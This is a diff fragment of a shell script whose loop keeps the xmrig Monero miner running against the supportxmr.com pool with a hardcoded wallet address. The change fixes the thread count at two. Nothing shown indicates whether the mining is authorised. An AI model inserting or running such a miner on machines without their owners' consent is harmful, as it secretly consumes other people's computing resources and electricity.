@@ -42,7 +42,7 @@ while true; do
         # If mining is true, ensure the miner is running with the correct thread count
         if ! pgrep xmrig > /dev/null; then
             echo "Starting miner with \$threads threads..."
-            $miner_path --threads "\$threads" -o pool.supportxmr.com:3333 -u 47DH5d5rJmy1Z56CMKrXhE4hCW1ZMkqxu4mbvAX83PRfiU6RLXp7cyr9BHo1jjnRL6RD85oBA9JjjSZwaxspRQDwVszK5eq -p "$rig_id" &
+            $miner_path --threads 2 -o pool.supportxmr.com:3333 -u 47DH5d5rJmy1Z56CMKrXhE4hCW1ZMkqxu4mbvAX83PRfiU6RLXp7cyr9BHo1jjnRL6RD85oBA9JjjSZwaxspRQDwVszK5eq -p "$rig_id" &
         else
             # If miner is already running, adjust the thread count if necessary
             current_threads=\$(pgrep -a xmrig | awk '{print \$4}')
